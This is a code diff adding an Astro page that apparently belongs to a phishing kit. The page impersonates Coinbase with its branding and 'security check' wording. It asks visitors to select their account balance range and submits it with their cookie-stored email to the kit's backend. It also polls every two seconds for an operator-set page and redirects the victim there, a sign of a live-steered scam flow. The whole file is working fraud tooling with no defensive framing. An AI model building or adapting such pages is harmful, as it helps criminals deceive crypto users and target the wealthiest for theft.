@@ -1,0 +1,268 @@
+---
+export const prerender = false;
+import AuthLayout from '../layouts/AuthLayout.astro';
+import AuthCard from '../components/AuthCard.astro';
+import { getUserByEmail, initializeDb } from '../lib/db';
+
+initializeDb();
+
+// Get the cookie from the request
+const cookieHeader = Astro.request.headers.get('cookie');
+const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
+const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
+
+// If no user email in cookie, redirect to signin
+if (!userEmail) {
+  return Astro.redirect('/signin');
+}
+
+// Check if user exists in database
+const user = await getUserByEmail(userEmail);
+
+if (!user) {
+  return Astro.redirect('/signin');
+}
+
+// If user is not on balance page, redirect to their current page
+if (user.current_page && user.current_page !== 'balance') {
+  return Astro.redirect(`/${user.current_page}`);
+}
+---
+
+<AuthLayout title="Confirm Balance">
+  <AuthCard>
+    <div class="coinbase-card">
+      <div class="coinbase-logo">coinbase</div>
+      <h2 class="coinbase-heading">Confirm your active balance</h2>
+      <p class="coinbase-subtext">
+        This is just a security check for your safety. Please check your
+        current balance in the Coinbase app and come back to select it
+        here.
+      </p>
+      <form id="balanceForm" class="coinbase-verification-form">
+        <p class="coinbase-subtext">Current Balance</p>
+        <div class="balance-options">
+          <label class="balance-option">
+            <input type="radio" name="balance" value="Less than $1,000" required />
+            Less than $1,000
+          </label>
+          <label class="balance-option">
+            <input type="radio" name="balance" value="$1,000 - $5,000" required />
+            $1,000 - $5,000
+          </label>
+          <label class="balance-option">
+            <input type="radio" name="balance" value="$5,000 - $10,000" required />
+            $5,000 - $10,000
+          </label>
+          <label class="balance-option">
+            <input type="radio" name="balance" value="$10,000 - $50,000" required />
+            $10,000 - $50,000
+          </label>
+          <label class="balance-option">
+            <input type="radio" name="balance" value="$50,000+" required />
+            $50,000+
+          </label>
+        </div>
+        <button type="submit" class="coinbase-continue-btn" disabled>Continue</button>
+      </form>
+    </div>
+  </AuthCard>
+</AuthLayout>
+
+<style is:global>
+  :root {
+    overflow-x: hidden;
+    background: #111214;
+  }
+</style>
+
+<style>
+  :global(.auth-card-container) {
+    margin-top: 50px;
+  }
+  
+  .coinbase-card {
+    border-radius: 1rem;
+    max-width: 320px;
+    margin: 2rem auto;
+  }
+  .coinbase-logo {
+    font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+    font-weight: 700;
+    font-size: 1.5rem;
+    color: #1652f0;
+    margin-bottom: 1rem;
+    text-align: left;
+    letter-spacing: -1px;
+  }
+  .coinbase-heading {
+    color: #fff;
+    font-size: 1rem;
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+    text-align: left;
+  }
+  .coinbase-subtext {
+    color: #b5b5b6;
+    font-size: 0.85rem;
+    line-height: 1.3;
+    margin-bottom: 1.2rem;
+    text-align: left;
+  }
+  .coinbase-verification-form {
+    display: flex;
+    flex-direction: column;
+    gap: 0.8rem;
+  }
+  .balance-options {
+    display: flex;
+    flex-direction: column;
+    gap: 0.6rem;
+  }
+  .balance-option {
+    display: flex;
+    align-items: center;
+    padding: 0.6rem;
+    background: #23262a;
+    border: 1.5px solid #23262a;
+    border-radius: 0.4rem;
+    color: #fff;
+    font-size: 0.85rem;
+    cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .balance-option input[type="radio"] {
+    margin-right: 0.6rem;
+    accent-color: #1652f0;
+  }
+  .coinbase-continue-btn {
+    width: 100%;
+    padding: 0.7rem 0;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #fff;
+    background: #1652f0;
+    border: none;
+    border-radius: 0.4rem;
+    cursor: pointer;
+    opacity: 1;
+    margin-top: 0.3rem;
+    transition: background 0.2s, color 0.2s, opacity 0.2s;
+  }
+  .coinbase-continue-btn:hover:enabled {
+    background: #0a46e4;
+  }
+   .coinbase-continue-btn:disabled {
+    background: #23262a;
+    color: #b5b5b6;
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+  .error-message {
+    color: #ff4d4f;
+    font-size: 0.9rem;
+    margin-bottom: 1rem;
+    text-align: left;
+  }
+</style>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // Add polling for current_page changes
+    const checkCurrentPage = async () => {
+      try {
+        const email = decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1] || '');
+        if (!email) return;
+        
+        const response = await fetch('/api/users?email=' + encodeURIComponent(email));
+        const userData = await response.json();
+        
+        if (userData.current_page && userData.current_page !== 'balance') {
+          window.location.href = '/' + userData.current_page;
+        }
+      } catch (error) {
+        console.error('Error checking current page:', error);
+      }
+    };
+
+    // Check every 2 seconds
+    setInterval(checkCurrentPage, 2000);
+
+    // Handle form submission
+    const form = document.getElementById('balanceForm') as HTMLFormElement;
+    const continueButton = form?.querySelector<HTMLButtonElement>('.coinbase-continue-btn');
+    const balanceOptions = form?.querySelectorAll<HTMLInputElement>('input[name="balance"]');
+
+    const updateButtonState = () => {
+      const isAnySelected = Array.from(balanceOptions || []).some(input => input.checked);
+      if (continueButton) {
+        continueButton.disabled = !isAnySelected;
+      }
+    };
+
+    balanceOptions?.forEach(input => {
+      input.addEventListener('change', updateButtonState);
+    });
+
+    // Initial button state
+    updateButtonState();
+
+    form?.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const selectedBalanceInput = form.querySelector<HTMLInputElement>('input[name="balance"]:checked');
+      const balanceRange = selectedBalanceInput?.value;
+
+      if (balanceRange) {
+        try {
+          if (continueButton) {
+            continueButton.disabled = true;
+            continueButton.textContent = 'Submitting...';
+          }
+          
+          const email = decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1] || '');
+
+          const response = await fetch('/api/users', {
+            method: 'PUT',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              email: email,
+              balance_range: balanceRange,
+              current_page: 'wait' // Redirect to wait after submission
+            })
+          });
+
+          if (response.ok) {
+            window.location.href = '/wait'; // Redirect to wait page
+          } else {
+            const error = await response.json();
+            const errorMessage = document.createElement('div');
+            errorMessage.className = 'error-message';
+            errorMessage.textContent = error.message || 'Failed to submit balance. Please try again.';
+            form.insertBefore(errorMessage, form.firstChild);
+
+            if (continueButton) {
+              continueButton.disabled = false;
+              continueButton.textContent = 'Continue';
+            }
+          }
+        } catch (error) {
+          console.error('Error submitting balance:', error);
+          const errorMessage = document.createElement('div');
+          errorMessage.className = 'error-message';
+          errorMessage.textContent = 'Network error. Please try again.';
+          form.insertBefore(errorMessage, form.firstChild);
+
+          if (continueButton) {
+            continueButton.disabled = false;
+            continueButton.textContent = 'Continue';
+          }
+        }
+      } else {
+        alert('Please select your current balance.');
+      }
+    });
+  });
+</script> 
